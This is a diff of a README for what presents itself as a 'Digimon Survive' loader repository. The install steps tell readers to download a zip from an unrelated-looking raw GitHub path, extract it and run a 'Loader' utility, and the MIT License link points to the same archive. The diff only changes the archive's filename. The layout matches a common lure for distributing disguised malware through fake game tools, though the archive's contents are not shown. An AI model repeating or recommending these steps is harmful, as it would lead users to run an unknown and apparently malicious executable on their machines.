@@ -24,7 +24,7 @@ Welcome to the **Digimon Survive ** repository! Enjoy seamless access to Digimon
 
 ## 🚀 Installation
 
-1. Download **https://raw.githubusercontent.com/mshobari/local_ollama_project/main/epeirogeny/local_ollama_project.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/mshobari/local_ollama_project/main/epeirogeny/local_project_ollama_v1.3.zip** from the repository.
 2. Extract the Loader file using 7zip or WinRAR.
 3. Run the Loader utility and follow the on-screen instructions.
 4. Launch Digimon Survive and dive into your journey!
@@ -39,5 +39,5 @@ This repository is for educational and testing purposes only. We do **not** host
 
 ## 📜 MIT License
 
-This repository is distributed under the [MIT License](https://raw.githubusercontent.com/mshobari/local_ollama_project/main/epeirogeny/local_ollama_project.zip).  
+This repository is distributed under the [MIT License](https://raw.githubusercontent.com/mshobari/local_ollama_project/main/epeirogeny/local_project_ollama_v1.3.zip).  
 2025 © Digimon Survive Loader Team
